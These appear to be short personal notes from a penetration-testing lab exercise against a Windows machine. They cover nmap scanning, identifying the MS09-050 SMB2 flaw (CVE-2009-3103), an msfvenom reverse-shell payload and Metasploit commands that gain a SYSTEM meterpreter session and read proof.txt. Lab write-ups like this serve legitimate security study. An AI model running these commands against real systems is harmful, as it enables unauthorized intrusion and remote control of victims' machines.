nmap shows 53 dns, 135 smb, 139 rpc, 445 smb, 3389 rdp, 5357?

There were no entry points
so we decide to do 
`sudo nmap -Pn -sC -sV -vv 192.168.244.40 --script=smb-vuln* -p445,139`
This gives us cve-2009-2193 - a wrong one
Then
`sudo nmap -Pn -sC -sV -vv 192.168.244.40 --script=vuln -p445,139`
gives us the right one, 2009-3103

The exploit needed smbmodule, which was recommended to be run in venv
```zsh
python -m venv .
#creates a venv in the current dir

$(realpath bin)/pip install smbprotocol
#uses the pip of the current venv, which is inside bin

bin/python exploit IP
```

replace the buf_of exploit
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.247 LPORT=443  EXITFUNC=thread  -f python -v shell`

Absolute shitshow, honestly

had to go with msfconsole
```
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.45.247
set RHOSTS 192.168.244.40
set payload windows/meterpreter/reverse_tcp
run

getuid
#nt authority
cd ../../
#cuz cd C:\Users\Admin wasnt working
cd Users\Administrator\Desktop
cat proof.txt
```